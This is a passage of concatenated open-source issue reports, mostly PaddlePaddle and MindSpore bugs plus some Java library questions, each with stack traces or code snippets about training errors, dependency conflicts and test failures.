[/paddle/paddle/fluid/operators/conv_op.cc:49]`"
Get exception when run distribute fluid with parallel executor,"Detail error is : PaddlePaddle: gpu-latest OS: docker ubuntu 16.04   <code>: Traceback (most recent call last): File ""/models/image_classification/vgg16_pe_gpu.py"", line 331, in &lt;module&gt; main() File ""/models/image_classification/vgg16_pe_gpu.py"", line 317, in main train_loop(train_exe, test_exe) File ""/models/image_classification/vgg16_pe_gpu.py"", line 200, in train_loop fetch_list=[avg_cost.name, batch_acc.name, batch_size.name]) File ""/usr/local/lib/python2.7/dist-packages/paddle/fluid/parallel_executor.py"", line 210, in run self.executor.run(fetch_list, fetch_var_name) paddle.fluid.core.EnforceNotMet: enforce x_mat_dims[1] == y_mat_dims[0] failed, 25088 != 512 First matrix's width must be equal with second matrix's height. at [/paddle/paddle/fluid/operators/mul_op.cc:63] PaddlePaddle Call Stacks: 0 0x7f69a2077c3cp paddle::platform::EnforceNotMet::EnforceNotMet(std::__exception_ptr::exception_ptr, char const*, int) + 572 1 0x7f69a2a118d6p paddle::operators::MulOp::InferShape(paddle::framework::InferShapeContext*) const + 2678 2 0x7f69a2e37518p paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) const + 104 3 0x7f69a2c93b5ep 4 0x7f69a2caa16dp 5 0x7f69a2ca91bdp paddle::framework::details::OpHandleBase::RunAndRecordEvent(std::function&lt;void ()&gt; const&amp;) + 845 6 0x7f69a2c93f40p paddle::framework::details::ComputationOpHandle::RunImpl() + 368 7 0x7f69a2caaa01p paddle::framework::details::OpHandleBase::Run(bool) + 321 8 0x7f69a2ca018cp 9 0x7f69a2ca06e0p 10 0x7f69a2b236fep std::__future_base::_State_baseV2::_M_do_set(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;*, bool*) + 46 11 0x7f69f4d6ba99p 12 0x7f69a2c9f45dp 13 0x7f69a2ca52d4p std::thread::_Impl&lt;std::_Bind_simple&lt;ThreadPool::ThreadPool(unsigned long)::{lambda()#1} ()&gt; &gt;::_M_run() + 340 14 0x7f69eb5c8c80p 15 0x7f69f4d646bap 16 0x7f69f4a9a41dp clone + 109 + check_trainer_ret 1 + ret=1 + stdbuf -oL echo 'job returned 1...setting pod return message...' job returned 1...setting pod return message... + stdbuf -oL echo =============================== =============================== + '[' 1 -eq 136 ']' + '[' 1 -eq 139 ']' + '[' 1 -eq 1 ']' + echo 'General Error' + stdbuf -oL echo 'termination log wroted...' termination log wroted... + exit 1"
在mac环境下使用springboot jpa 和 通用mapper tomcat 环境下启动报错,"Caused by: java.lang.NoSuchMethodError: javax.persistence.spi.PersistenceUnitInfo.getValidationMode()Ljavax/persistence/ValidationModel 排除 jar包后问题解决 在中写 必须依赖的包.是否能排除,对不对使用tk.mapper有影响.   <code>: &lt;dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mapper-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.2.4&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;groupId&gt;javax.persistence&lt;/groupId&gt; &lt;artifactId&gt;persistence-api&lt;/artifactId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;groupId&gt;tk.mybatis&lt;/groupId&gt; &lt;dependencies&gt; &lt;!--必须依赖--&gt; &lt;dependency&gt; &lt;groupId&gt;javax.persistence&lt;/groupId&gt; &lt;artifactId&gt;persistence-api&lt;/artifactId&gt; &lt;version&gt;1.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework&lt;/groupId&gt; &lt;artifactId&gt;spring-context&lt;/artifactId&gt; &lt;version&gt;${spring.version}&lt;/version&gt; &lt;scope&gt;compile&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt;"
Refine Sum in elementwise_op_function,"wrap the __shfl_down_sync <del>make __shfl_down_sync support unsigned, long, long long, double, etc.</del> For CUDA 9.0 and above 9.0, the type of __shfl_down_sync's parameter can be int, unsigned int, long, unsigned long, long long, unsigned long long, float or double. With the cuda_fp16.h header included, it can also be __half or __half2. Below CUDA 9.0, the type of __shfl_down's parameter should be int or float, other than must first be cast. Those things that casting other types to int or float have been done in sm_30_intrinsics.h or sm_30_intrinsics.hpp. please refer:   <code>: /home/work/cuda-6.5/include/sm_30_intrinsics.h"
confirm加上ajax之后点击没反应是什么问题啊,"把ajax里面去掉就可以了，但是我想请求后端，这个该怎么写啊   <code>: layer.confirm('真的删除行么', function(index){ $.ajax({ url: ""/delete"", type: ""POST"", dataType: ""json"", data: {""date"": jsonData}, success: function (msg) { let returnCode = msg.code; if (returnCode === 1) { //删除这一行 obj.del(); //关闭弹框 layer.close(index); layer.msg(""删除成功"", {icon: 6}); } else { layer.msg(""删除失败"", {icon: 5}); } }"
How to specify the distributed training job resource,"在用户提交分布式训练任务时，集群需要确定以下几个资源： trainer/pserver count: trainer/pserver 进程数量 trainer/pserver memory: 每个 trainer/pserver 进程的memory limit trainer CPU/GPU count: 每个trainer 进程使用 CPU/GPU count pserver CPU count: 每个pserver使用的CPU count 分别指定所有的资源使用情况： <em>好处</em>：直接 <em>坏处</em>：用户需要知道集群中物理硬件的情况，例如一台机器多少块GPU卡，例如每台机器只有4块GPU卡，那么应该指定而不是 只指定一共需要的 和 ，根据集群物理配置决定以及按比例分配, 和 <em>好处</em>：用户可以无感知集群的物理配置情况，根据集群当前情况动态调整 <em>坏处</em>：灵活性略差，和根据不同的模型可能需要不同的分配比例，没有办法达到最优。   <code>: trainer_gpu_num=4, trainer_count=2 trainer_gpu_num=8, trainer_count=1 CPU/GPU count memory limit pserver/trainer count pserver/trainer memoery pserver CPU limit trainer CPU/GPU limit pserver/trainer count pserver CPU limit trainer CPU limit"
PyDataProvider2报错,"报错信息如下： 麻烦帮忙排查，谢谢。   <code>: `define_py_data_sources2(train_list='train.list', test_list='test.list', module=('ei_fea_provider_marriage', 'ei_fea_provider_marriage_test'), obj=('processData', 'processData'))` &gt; F1111 14:51:41.775494 30126 PythonUtil.cpp:130] Check failed: (ret) != nullptr Python Error: &lt;type 'exceptions.TypeError'&gt; : ('processData', 'processData') has type &lt;type 'tuple'&gt;, but expected one of: (&lt;type 'str'&gt;, &lt;type 'unicode'&gt;)"
`Tensor`是不是`Variable`的Data Member？,一个神经网络的计算图包括两个部分组成，和。Engine输入一个计算图进行计算。而Tensor是在实现Kernel时候的输入输出变量。与的相似点很多。可否为的一个Data Member呢？ 下面是论点，他们是: Tensor和Variable具有很多相似相同属性 一个Variable可以配置的属性可以包括: 而一个Tensor需要的属性是: 其中，和是二者共有的，并且Variable和Tensor这两个字段，数值、类型都相同。 Tensor与Variable是一一对应的，Tensor需要使用Variable的名字被用户访问 在计算图中的一个Variable即对应了计算引擎中的一个Tensor数据。二者在实现上是一一对应的。并且，End-User需要使用Variable的名字来访问对应Tensor的值。例如: 在计算图中配置了的Variable。End-User应该可以对的Tensor进行初始化，或使用随机，或使用载入。 用户在一个mini-batch结束后，应该可以获取这个计算图的任意一个输出。也就是，譬如这个Variable的值。这样才能做model inference。 不同神经网络框架的实现: 框架名 配置格式 实现手法 tensorflow proto TBD caffe2 proto Caffe2 用户配置了protobuf描述。caffe2的C++ part将用户描述的Variable protobuf在Workspace中转换成Blob，Blob的一个DataMember是Tensor MxNet C++ class TBD PyTorch - Variable是 Tensor 的一个wrapper DyNet C++ class DyNet的Variable分为Parameter，Inputs等等，但他们都是Tensor的一个Wrapper 问题: 我们的Variable是否是Tensor的Wrapper，即 推论，如果Variable里面既有包含Tensor，那么Tensor的内存分配要求是Lazy的，即仅仅在mini-batch开始时，engine分配内存，或者当用户写入Variable数据的时候分配内存(randomize/load)。而不是创建一个的时候就分配了内存。因为在Engine执行时，dim_可能会变。并且Engine执行时，可能在不同设备上申请的内存。   <code>: Op Variable Op Tensor Variable Tensor Variable struct Variable { string name_; DDim dims_; Place place_; bool needBackward_; }; struct Tensor { shared_ptr ptr_; DDim dims_; Place place_; }; dims_ place_ fc.weight fc.weight randomize load prediction.prob struct Tensor {...}; struct Variable { TensorPtr tensor_; string name_; bool needBackward_; }; Variable Variable Variable
OpenAPI3.0 无法显示示例参数,"OpenAPI 3.0.1版本 生成的openapi.json中部分片断如下 在knife4j调试界面，这个接口中参数的示例是空的。   <code>: ""/api/v1/movie/{movieId}"" : { ""get"" : { ""tags"" : [ ""电影接口"" ], ""summary"" : ""获取指定编号的电影信息"", ""description"" : ""获取指定编号的电影信息"", ""operationId"" : ""movie"", ""parameters"" : [ { ""name"" : ""movieId"", ""in"" : ""path"", ""description"" : ""电影编号"", ""required"" : true, ""schema"" : { ""type"" : ""integer"", ""format"" : ""int32"" }, ""example"" : ""123456"" } ], ""responses"" : { ""200"" : { ""description"" : ""指定编号的电影信息"", ""content"" : { ""application/json"" : { ""schema"" : { ""$ref"" : ""#/components/schemas/MovieResult"" } } } } } } }"
some mistakes in Paddle installation wiki of docker version,"As mentioned in the Chinese installation wiki, there are 6 docker images, such as paddledev/paddlepaddle:latest-cpu. But from docker images repository, the useful ones are images like paddledev/paddle:cpu-latest. So, command of Installing and Running docker image should be as follows, Thanks.   <code>: $ docker run -it paddledev/paddle:cpu-latest"
基于C  训练库的demo trainer在MKLDNN下报segmentation fault,"###错误描述 基于C++训练库的demo trainer在MKLDNN下报segmentation fault: http://ci.paddlepaddle.org/viewLog.html?tab=buildLog&amp;logTab=tree&amp;filter=debug&amp;expand=all&amp;buildId=171521&amp;_focus=6744 本地编译时选择 WITH_MKL=ON, WITH_MKLDNN=ON是出错，WITH_MKL=ON, WITH_MKLDNN=OFF时正常运行, 应该是MKLDNN的问题。 错误排查 错误出现在运行这一行时：https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/fluid/train/demo/demo_trainer.cc#L83 经过排查，是在tensor.cc里面，holder_.reset()时出的错： https://github.com/PaddlePaddle/Paddle/blob/develop/paddle/fluid/framework/tensor.cc#L55 如何复现这一错误？ 然后，在Paddle/paddle/fluid/train/demo文件夹下：   <code>: cmake .. -DWITH_GPU=OFF -DWITH_DISTRIBUTE=OFF -DON_INFER=ON make -j40 fluid_lib_dist make -j40 inference_lib_dist set -x PADDLE_ROOT=your_Paddle/ TURN_ON_MKL=ON # use MKL or Openblas # download models function download() { wget -q http://paddle-tar.bj.bcebos.com/train_demo/LR/main_program wget -q http://paddle-tar.bj.bcebos.com/train_demo/LR/startup_program } download # build demo trainer fluid_install_dir=${PADDLE_ROOT}/build/fluid_install_dir mkdir -p build cd build rm -rf * cmake .. -DPADDLE_LIB=$fluid_install_dir \ -DWITH_MKLDNN=ON \ -DWITH_MKL=$TURN_ON_MKL make cd .. # run demo trainer build/demo_trainer"
Need the ability to group operations together. Similar to collections in Tensorflow,"This problem came into light when I was investigating the method we could use to move regularization to Pserver (https://github.com/PaddlePaddle/Paddle/issues/7432). The current distributed transpiler splits the and the and passes different slices to each pserver. Hence, when we create optimize ops, we use sliced parameters and gradients. However, the distribute transpiler currently does this through a hack. The transpiler identifies these by checking if the op contains inputs called and . This works well because optimize ops have their own dedicated operations called , , etc. However, in case of regularization and gradient clipping, we rely on generic tensor ops like and . These ops take as inputs the parameters and thus on the pserver they should take the sliced parameters as inputs. Thus we need a way to identify these ops in the distribute transpiler, so that we can make sure that we pass the sliced and as inputs to them. The above-mentioned hack will not work for this case because these are generic ops which have input and output names like , , etc. A hacky solution would be to create dedicated ops for regularization. Currently, regularization layer adds a scale and an elementwise_add op in Python. Instead, we could create a separate op which composes these 2 ops in C++. A better and a more sustainable solution would be to support adding tags to Python ops. This could allow us to group ops of similar tags. In this way, we can make sure that all the ops that are added for regularization carry a regularization tag. Similarly, gradient clipping ops carry a tag. The distribute transpiler can then process the ops by tag and apply whatever slicing logic it needs to apply to them. These tags are similar to the concept of Collections in Tensorflow.   <code>: params grads ops Param Grad sgd_op adam_op scale elementwise_add params grads X Y"
感谢作者增加字段长度和精度，但没有sqlserver,"我自己也写过一个类似的，但作者这个通用新比较好，我们sqlserver是主数据库，我加了sqlserver的长度和精度   <code>: public class SqlServerColumnSelector extends ColumnSelector { private static final SqlServerTypeFormatter TYPE_FORMATTER = new SqlServerTypeFormatter(); private static String TABKE_DETAIL_SQL = new StringBuilder() .append(""SELECT"") .append("" col.name AS column_name"") .append("" , col.max_length AS MaxLength"") //sqlserver 字段长度 .append("" , col.scale AS Scale"") //sqlserver 字段精度 .append("" , bt.name AS type"") .append("" , col.is_identity"") .append("" , ext.value AS comment"") //sqlserver 字段长度 String maxLength = FieldUtil.convertString(rowMap.get(""MAXLENGTH"")); columnDefinition.setMaxLength(new Integer(StringUtils.isEmpty(maxLength) ? ""0"" : maxLength)); //sqlserver 字段精度 String scale = FieldUtil.convertString(rowMap.get(""SCALE"")); columnDefinition.setScale(new Integer(StringUtils.isEmpty(scale) ? ""0"" : scale));"
[CT][MS][Tile]The test case is stuck at ascend pynative mode,"ascend环境， pynative模式下tile 整个测试文件.py（含有37条用例）执行时会卡住， 图模式下没问题， cpu后端也没有问题 / 硬件环境: /device ascend : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph ascend +pynative， 全量执行tile测试用例， pytest test_tile.py 用例执行没问题， 不会卡住 用例会卡在上面的用例， 该用例改成只验mindspore正向， 仍然会卡住   <code>: def test_tile_input_dtype_uint64(): x = Tensor(np.random.randint(0, 200, size=(12, 28, 15, 9)).astype(np.uint64), dtype=mstype.uint64) mul = (12, 2, 9, 2) fact = TileMock(inputs=[x, mul]) fact.forward_cmp() fact.grad_cmp()"
pytorch转换为paddle中可视化方面问题,这一段代码在paddle中有对应的用法吗   <code>: from torch.utils.tensorboard import SummaryWriter
"CSV dataset reports an error about “Invalid csv file, unexpected quote in unquote field from /home/mark/code/glue_data/CoLA/train.tsv”","使用CSVDataset接口读取glue数据集中的CoLA数据集，出现双引号不支持的报错。是否当前mindspore不支持双引号的版本？ / 硬件环境: /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行下述代码 运行报错，报错日志如下： 对应的数据行为：   <code>: import mindspore.dataset as ds DATA_FILE = '/home/mark/code/glue_data/CoLA/train.tsv' dataset = ds.CSVDataset(DATA_FILE, shuffle=False, field_delim='\t', column_names=['index', 'label', 'mark', 'sentence']) print(dataset.get_col_names()) for data in dataset.create_dict_iterator(output_numpy=True): print(data) RuntimeError: Unexpected error. Invalid file, failed to parse csv file: /home/mark/code/glue_data/CoLA/train.tsv at line 3057. Error message: Invalid csv file, unexpected quote in unquote field from /home/mark/code/glue_data/CoLA/train.tsv. l-93 1 Susan whispered ""Shut up"" at them."
有新的api可参考么？用1.9里的有的发现对不上了。,"参考 https://git.oschina.net/lionsoul/jcseg/raw/v1.9.7-RC0/Jcseg-%E5%BC%80%E5%8F%91%E5%B8%AE%E5%8A%A9%E6%96%87%E6%A1%A3.pdf 使用如下添加关键词 发现CJK_WORDS已经不存在了，之后换成CJK_WORD好了。 现使用如下添加关键词，中文的没问题，英文和中英混合的一直失败。。 查看ILexicon，发现里面只剩下 并不存在EC_MIXED_WORD这种文档中存在的词库的类别额 所写测试类 maven中仅引入了个核心jar包   <code>: dic.add(ILexicon.CJK_WORDS, “研究”, Iword.T_CJK_WORD); dic.add(ILexicon.CJK_WORD,""豆豆运动鞋"",IWord.T_CJK_WORD); int T_LEN = 10; int CJK_WORD = 0; int CJK_UNIT = 1; int CN_LNAME = 2; int CN_SNAME = 3; int CN_DNAME_1 = 4; int CN_DNAME_2 = 5; int CN_LNAME_ADORN = 6; int STOP_WORD = 7; int MIX_ASSIST_WORD = 8; int DOMAIN_SUFFIX = 9; int CJK_CHAR = 11; int UNMATCH_CJK_WORD = 12; public class JcsegUtil { static JcsegTaskConfig config = new JcsegTaskConfig(true); static ADictionary dic = DictionaryFactory.createSingletonDictionary(config, true); public static void main(String[] args) { addDic(); //创建JcsegTaskConfig分词配置实例，自动查找加载jcseg.properties配置项来初始化 //创建默认单例词库实现，并且按照config配置加载词库 //依据给定的ADictionary和JcsegTaskConfig来创建ISegment //为了Api往后兼容，建议使用SegmentFactory来创建ISegment对象 ISegment seg = null; try { seg = SegmentFactory.createJcseg( JcsegTaskConfig.NLP_MODE, new Object[]{config, dic} ); } catch (JcsegException e) { e.printStackTrace(); } //备注：以下代码可以反复调用，seg为非线程安全 //设置要被分词的文本 String str = ""DoublThaha男士豆豆运动鞋Wave大嘴包Sella折耳包""; try { seg.reset(new StringReader(str)); //获取分词结果 IWord word = null; while ( (word = seg.next()) != null ) { System.out.println(word.getValue()); } } catch (IOException e) { e.printStackTrace(); } } public static void addDic(){ dic.add(ILexicon.CJK_WORD,""豆豆运动鞋"",IWord.T_CJK_WORD); dic.add(ILexicon.CJK_WORD,""Doubl T"",IWord.T_CJK_WORD); //不管中英文这中间是否有空格，都无法达到分词效果 dic.add(ILexicon.CJK_WORD,""Wave 大嘴包"",IWord.T_CJK_WORD); dic.add(ILexicon.CJK_WORD,""Sella折耳包"",IWord.T_CJK_WORD); } } &lt;dependency&gt; &lt;groupId&gt;org.lionsoul&lt;/groupId&gt; &lt;artifactId&gt;jcseg-core&lt;/artifactId&gt; &lt;version&gt;2.1.1&lt;/version&gt; &lt;/dependency&gt;"
使用模板导入excel数据时，个别数据内容被修改,"你好，使用模板导入excel数据时，数据内容被修改。 excel值为 “HL2.0” ， 导入后变成“HL2”。 请问如何解决这个问题？ 它是针对什么问题处理的？如果我改掉，会不会影响其他的问题？   <code>: if (String.class == fieldType) { String s = Convert.toStr(val); if (StringUtils.endsWith(s, "".0"")) { val = StringUtils.substringBefore(s, "".0""); } else { String dateFormat = field.getAnnotation(Excel.class).dateFormat(); if (StringUtils.isNotEmpty(dateFormat)) { val = parseDateToStr(dateFormat, val); } else { val = Convert.toStr(val); } } }"
[MS][ME][Control][Inner]lf in for testcase cause a serious switch and graph expand,": /device gpu /device cpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : If change the cycles of for to 10, the number of 'switch' will over 100. Foward network causes the expanding.Backward network maybe cause a more serious expanding.   <code>: pytest -s tests/st/control/inner/test_012_if_in_for.py::test_forward"
Pynative下，算子初始化后，修改属性行为不改变,"nn.conv2d在初始化之后更改stride，行为不改变。Pynative下也不生效。ops.conv2d也不支持。 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : 1.7 -- Python version : 3.7 -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative   <code>: import numpy as np import mindspore as ms import mindspore.nn as nn from mindspore import Tensor ms.set_context(mode=ms.PYNATIVE_MODE) net = nn.Conv2d(120, 240, 4, has_bias=False, weight_init='normal') x = Tensor(np.ones([1, 120, 1024, 640]), ms.float32) output_0 = net(x).shape print(output_0) print(net.stride) net.stride = (3,3) output_1 = net(x).shape print(output_1) print(net.stride)"
[MS][GPU-Lgamma]dynamic shape test cases has some problems,"动态shape补充反向用例出现精度问题 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph test_dynamic_shape_lgamma_4d_float16 test_dynamic_shape_lgamma_7d_float32 test_dynamic_shape_lgamma_5d_float64 test_dynamic_shape_lgamma_4d_float16 _________________________________________________________________________________ test_lgamma.py:222: ../share/ops/primitive/lgamma_ops.py:131: in grad_dynamic_shape_cmp allclose_nparray(input_grad_pytorch, input_grad_mindspore, self.loss, self.loss) data_expected = array([[[[-4.1775e+02, 2.2583e-02, -1.3135e-01, ..., -1.6006e-02, -2.1758e+00, -2.1423e-01], [-3.5... [ 2.4948e-02, -2.2871e+00, 3.8452e-01, ..., -6.9875e+01, 1.0971e-02, -2.9746e+00]]]], dtype=float16) data_me = array([[[[-8.3188e+01, 3.7140e-02, -8.0957e-01, ..., -3.5034e-01, 3.2402e+00, 9.2090e-01], [-2.5... [ 6.1035e-02, 9.0186e-01, -1.0146e+00, ..., -3.3496e+00, 1.2402e-01, -2.0416e-02]]]], dtype=float16) rtol = 0.001, atol = 0.001, equal_nan = True E AssertionError def test_dynamic_shape_lgamma_7d_float32(): input_x = Tensor(np.random.randn(16, 8, 3, 8, 11, 2, 12222).astype(np.float32)) fact = LgammaMock(inputs=[input_x]) fact.forward_dynamic_shape_cmp() test_lgamma.py:238: ../share/ops/primitive/lgamma_ops.py:131: in grad_dynamic_shape_cmp allclose_nparray(input_grad_pytorch, input_grad_mindspore, self.loss, self.loss) data_expected = array([[[[[[[ 2.48852614e-02, -5.11205387e+00, 5.51483202e+00, ..., -9.28026810e-03, 2.07724929e-01, -3...e+00, -6.38994528e-03, ..., 5.80374012e-03, -2.28758812e+00, -9.12423420e+00]]]]]]], dtype=float32) data_me = array([[[[[[[-3.50032181e-01, 4.30835724e-01, -5.46707535e+00, ..., 3.19608208e-03, -4.78841573e-01, -1...e+00, -1.03338413e-01, ..., -1.20779881e-02, 1.53072882e+00, -2.97457600e+00]]]]]]], dtype=float32) rtol = 0.0001, atol = 0.0001, equal_nan = True E AssertionError <ol start=""3""> def test_dynamic_shape_lgamma_5d_float64(): input_x = Tensor(np.random.randn(16, 9, 8, 6, 10000).astype(np.float64)) fact = LgammaMock(inputs=[input_x]) fact.forward_dynamic_shape_cmp() test_lgamma.py:254: ../share/ops/primitive/lgamma_ops.py:131: in grad_dynamic_shape_cmp allclose_nparray(input_grad_pytorch, input_grad_mindspore, self.loss, self.loss) data_expected = array([[[[[-9.58120883e-01, -4.61917734e+00, 5.40387726e+00, ..., 1.66612286e-02, -1.72127053e-01, 2.119...90399361e+00, -1.32572615e+00, 3.48860321e+01, ..., 4.48467098e-02, -1.62609830e-01, 3.28696632e+00]]]]]) data_me = array([[[[[ 1.27480386e+00, -5.22273396e+00, -1.37193906e+00, ..., 3.84332582e-01, -8.58926212e-01, 5.356...95888605e+00, 1.10326059e+00, 4.78293989e+00, ..., -3.77849926e-03, -1.37330610e+00, 8.95942230e-02]]]]]) rtol = 1e-05, atol = 1e-05, equal_nan = True E AssertionError ../share/utils.py:29: AssertionError pass   <code>: def test_dynamic_shape_lgamma_4d_float16(): input_x = Tensor(np.random.randn(8, 8, 8, 8888).astype(np.float16)) fact = LgammaMock(inputs=[input_x]) fact.forward_dynamic_shape_cmp() fact.grad_dynamic_shape_cmp() def allclose_nparray(data_expected, data_me, rtol, atol, equal_nan=True): if np.any(np.isnan(data_expected)) or np.any(np.isnan(data_me)): assert np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan) fact.grad_dynamic_shape_cmp() def allclose_nparray(data_expected, data_me, rtol, atol, equal_nan=True): if np.any(np.isnan(data_expected)) or np.any(np.isnan(data_me)): assert np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan) fact.grad_dynamic_shape_cmp() def allclose_nparray(data_expected, data_me, rtol, atol, equal_nan=True): if np.any(np.isnan(data_expected)) or np.any(np.isnan(data_me)): assert np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan)"
[CT][MS][动态shape索引]CheckStridedSlice不完全支持动态shape,"在对动态shape的索引取值测试中 发现PyNative模式下CheckStridedSlice函数的动态shape支持度不完全 / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative 因为其它bug影响暂时复现不了 之前与开发沟通过确认问题 passed RuntimeError: : The pointer[value_node] is null   <code>: def test_parser_dynamic_input_index_slice(): class Net(nn.Cell): def __init__(self): super().__init__() def construct(self, x): x = x[1:] return x class TorchNet(nn_torch.Module): def __init__(self): super().__init__() def forward(self, x): x = x[1:] return x net_ms = Net() dynamic_input = Tensor(shape=(None, 4), dtype=mstype.float32) net_ms.set_inputs(dynamic_input) net_pt = TorchNet() input_np = np.random.randn(6, 4).astype(np.float32) fact = ParserFactory(net_ms, net_pt, input_np) fact.forward_cmp() fact.backward_cmp()"
生成文档时报错java.sql.SQLException: Can't create/write to file '/tmp/MYaXRpYm' (Errcode: 28 - No space left on device),"数据库使用mysql，这是我的运行代码 DataSource dataSource = new HikariDataSource(hikariConfig); // 生成文件配置 EngineConfig engineConfig = EngineConfig.builder() // 生成文件路径，自己mac本地的地址，这里需要自己更换下路径 .fileOutputDir(""D:/"") // 打开目录 .openOutputDir(false) // 文件类型 .fileType(EngineFileType.WORD) // 生成模板实现 .produceType(EngineTemplateType.freemarker) .build(); // 生成文档配置（包含以下自定义版本号、描述等配置连接） Configuration config = Configuration.builder() .version(""1.0.3"") .description(""生成文档信息描述"") .dataSource(dataSource) .engineConfig(engineConfig) // .produceConfig(getProcessConfig()) .build(); // 执行生成 new DocumentationExecute(config).execute(); 报错信息 cn.smallbun.screw.core.exception.ScrewException: cn.smallbun.screw.core.exception.ScrewException: java.sql.SQLException: Can't create/write to file '/tmp/MYaXRpYm' (Errcode: 28 - No space left on device) Caused by: cn.smallbun.screw.core.exception.ScrewException: java.sql.SQLException: Can't create/write to file '/tmp/MYaXRpYm' (Errcode: 28 - No space left on device) at cn.smallbun.screw.core.util.ExceptionUtils.mpe(ExceptionUtils.java:62) at cn.smallbun.screw.core.query.mysql.MySqlDataBaseQuery.getTableColumns(MySqlDataBaseQuery.java:112) at cn.smallbun.screw.core.query.mysql.MySqlDataBaseQuery.getTableColumns(MySqlDataBaseQuery.java:127) at cn.smallbun.screw.core.process.DataModelProcess.process(DataModelProcess.java:89) at cn.smallbun.screw.core.execute.DocumentationExecute.execute(DocumentationExecute.java:50) ... 25 more Caused by: java.sql.SQLException: Can't create/write to file '/tmp/MYaXRpYm' (Errcode: 28 - No space left on device) at com.mysql.jdbc.SQLError.createSQLException(SQLError.java:965) at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3973) at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3909) at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:873) at com.mysql.jdbc.MysqlIO.nextRow(MysqlIO.java:1996) at com.mysql.jdbc.MysqlIO.readSingleRowSet(MysqlIO.java:3400) at com.mysql.jdbc.MysqlIO.getResultSet(MysqlIO.java:470) at com.mysql.jdbc.MysqlIO.readResultsForQueryOrUpdate(MysqlIO.java:3112) at com.mysql.jdbc.MysqlIO.readAllResults(MysqlIO.java:2341) at com.mysql.jdbc.MysqlIO.sqlQueryDirect(MysqlIO.java:2736) at com.mysql.jdbc.ConnectionImpl.execSQL(ConnectionImpl.java:2484) at com.mysql.jdbc.PreparedStatement.executeInternal(PreparedStatement.java:1858) at com.mysql.jdbc.PreparedStatement.executeQuery(PreparedStatement.java:1966) at com.mysql.jdbc.DatabaseMetaDataUsingInfoSchema.executeMetadataQuery(DatabaseMetaDataUsingInfoSchema.java:65) at com.mysql.jdbc.DatabaseMetaDataUsingInfoSchema.getColumns(DatabaseMetaDataUsingInfoSchema.java:278) at com.zaxxer.hikari.pool.ProxyDatabaseMetaData.getColumns(ProxyDatabaseMetaData.java:109) at com.zaxxer.hikari.pool.HikariProxyDatabaseMetaData.getColumns(HikariProxyDatabaseMetaData.java) at cn.smallbun.screw.core.query.mysql.MySqlDataBaseQuery.getTableColumns(MySqlDataBaseQuery.java:108) ... 28 more Disconnected from the target VM, address: '127.0.0.1:9469', transport: 'socket' Process finished with exit code -1   <code>: at cn.smallbun.screw.core.util.ExceptionUtils.mpe(ExceptionUtils.java:62) at cn.smallbun.screw.core.execute.DocumentationExecute.execute(DocumentationExecute.java:57) at com.nbpt.ScrewApplicationTests.contextLoads(ScrewApplicationTests.java:57) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.junit.runner.JUnitCore.run(JUnitCore.java:137) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:69) at com.intellij.rt.junit.IdeaTestRunner$Repeater$1.execute(IdeaTestRunner.java:38) at 